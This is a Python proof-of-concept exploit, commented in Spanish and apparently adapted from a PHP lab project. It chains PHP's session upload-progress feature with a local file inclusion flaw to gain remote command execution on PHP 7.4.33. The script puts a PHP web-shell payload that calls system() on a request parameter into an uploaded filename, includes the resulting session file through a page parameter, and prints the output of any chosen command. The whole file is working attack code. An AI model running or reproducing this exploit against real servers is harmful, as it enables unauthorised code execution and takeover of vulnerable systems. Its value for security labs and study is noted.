#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC adaptado para PHP 7.4.33 - Chain A: session.upload_progress + LFI -> RCE
Basado en el PoC original de kuwoo/php2shell-Lab.

Uso:
    python poc_74.py --target http://localhost:8083 --session-path /tmp/sessions --cmd "id"
"""

import argparse
import random
import string
import urllib.parse
import urllib.request
import sys

# Payload: ejecuta el comando que venga en ?c= y muestra un marcador.
PAYLOAD = "<?php echo '===RCE==='; system($_GET['c']); die(); ?>"


def main():
    ap = argparse.ArgumentParser(description="PoC Chain A para PHP 7.4.33")
    ap.add_argument(
        "--target",
        default="http://localhost:8083",
        help="URL del objetivo (por defecto http://localhost:8083)",
    )
    ap.add_argument(
        "--session-path",
        default="/tmp/sessions",
        help="Ruta base de las sesiones (ej. /tmp, /tmp/sessions, /var/lib/php/sessions)",
    )
    ap.add_argument("--cmd", default="id", help='Comando a ejecutar (por defecto "id")')
    args = ap.parse_args()
    base = args.target.rstrip("/")

    # Generar un SID aleatorio de 26 caracteres (formato típico de PHP)
    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=26))

    # 1. Construir el cuerpo multipart con el payload en el nombre del archivo
    boundary = "----php2shell74"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid + "\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nchain74\r\n'
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="' + PAYLOAD + '"\r\n'
        "Content-Type: text/plain\r\n\r\nZ\r\n"
        f"--{boundary}--\r\n"
    ).encode()

    # 2. Enviar la petición de inyección (POST multipart)
    try:
        req = urllib.request.Request(
            base + "/index.php",
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={sid}",
            },
        )
        with urllib.request.urlopen(req, timeout=10):
            pass  # Ignorar la respuesta; solo importa el efecto secundario
        print(f"[+] Inyección enviada. SID: {sid}")
    except Exception as e:
        print(f"[-] Error en la inyección: {e}")
        sys.exit(1)

    # 3. Construir la URL del LFI apuntando al archivo de sesión
    session_file = f"{args.session_path}/sess_{sid}"
    url = (
        f"{base}/index.php?page={urllib.parse.quote(session_file)}"
        f"&c={urllib.parse.quote(args.cmd)}"
    )
    print(f"[*] Intentando LFI en: {url}")

    # 4. Ejecutar el LFI y leer la respuesta
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            raw = r.read().decode(errors="replace")
    except Exception as e:
        print(f"[-] Error en la petición LFI: {e}")
        sys.exit(1)

    # 5. Extraer y mostrar la salida limpia del comando
    if "===RCE===" in raw:
        output = raw.split("===RCE===", 1)[-1].strip()
        print("[+] ¡Éxito! Salida del comando:")
        print(output if output else "(sin salida)")
    else:
        print("[-] El payload no se ejecutó. Posibles causas:")
        print(f"    - La ruta de sesión no es correcta (probaste: {args.session_path})")
        print("    - El LFI no está presente o la ruta del archivo es diferente.")
        print("    - El servidor no escribe el nombre del archivo en la sesión.")
        print("    - Respuesta cruda (primeros 300 chars):")
        print(raw[:300])


if __name__ == "__main__":
    main()
